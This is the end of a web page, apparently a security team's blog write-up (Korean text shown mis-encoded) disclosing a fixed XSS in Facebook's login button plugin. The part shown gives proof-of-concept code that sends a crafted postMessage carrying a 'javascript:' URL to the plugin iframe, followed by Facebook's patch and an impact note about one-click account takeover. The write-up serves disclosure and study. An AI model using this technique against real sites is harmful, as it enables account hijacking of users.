  <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">123</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">javascript:alert(document.domain);</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">ORIGIN</span><span class="dl">"</span><span class="p">};</span>
  <span class="nx">iframeEl</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
<span class="p">};</span>
<span class="p">&lt;</span><span class="err">/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id=</span><span class="s2">"fbframe"</span> <span class="na">src=</span><span class="s2">"https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true"</span> <span class="na">onload=</span><span class="s2">"fbFrameLoaded(this)"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div></div>

<h2 id="fix">Fix</h2>

<p>Facebookì€ <code class="highlighter-rouge">url</code> íŒŒë¼ë¯¸í„°ì— ì •ê·œì‹ ê²€ì‚¬ë¥¼ ì¶”ê°€í•˜ì—¬ domainê³¼ schemaê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë°©ë²•ìœ¼ë¡œ íŒ¨ì¹˜í–ˆìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">d</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">isFacebookURI</span><span class="dl">"</span><span class="p">)(</span><span class="k">new</span> <span class="p">(</span><span class="nx">g</span> <span class="o">||</span> <span class="p">(</span><span class="nx">g</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">URI</span><span class="dl">"</span><span class="p">)))(</span><span class="nx">c</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">url</span><span class="p">)),</span>
<span class="nx">j</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">call</span><span class="p">;</span>
<span class="nx">d</span> <span class="o">||</span> <span class="p">(</span><span class="nx">j</span><span class="p">.</span><span class="nx">url</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">XOAuthErrorController</span><span class="dl">"</span><span class="p">).</span><span class="nx">getURIBuilder</span><span class="p">().</span><span class="nx">setEnum</span><span class="p">(</span><span class="dl">"</span><span class="s2">error_code</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">PLATFORM__INVALID_URL</span><span class="dl">"</span><span class="p">).</span><span class="nx">getURI</span><span class="p">().</span><span class="nx">toString</span><span class="p">())</span>
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p><a href="https://youtu.be/KAnuFy2F7QA">https://youtu.be/KAnuFy2F7QA</a></p>

<h2 id="impact">Impact</h2>

<p>ì˜ëª»ëœ post message ì„¤ì • ë•Œë¬¸ì— ëˆ„êµ°ê°€ëŠ” ê³µê²©ìì˜ ì›¹ì„¸ì´íŠ¸ì— ì ‘ì†í•˜ê³  í˜ì´ìŠ¤ë¶ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ê¸° ë²„íŠ¼ì„ í´</p>

<p>ë¦­í•¨ìœ¼ë¡œì¨ <a href="http://facebook.com">facebook.com</a> ë„ë©”ì¸ì— XSSê°€ ë°œìƒí•˜ê³  <strong>í•œ ë²ˆì˜ í´ë¦­ ë§Œìœ¼ë¡œ ê³„ì •ì„ íƒˆì·¨</strong> í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

   </div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
   <a href="/2020-05-01/memory" class="left arrow">&#8592;</a>
  
  
   <a href="/2020-05-01/Lua" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2020-09-02 01:11:28 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
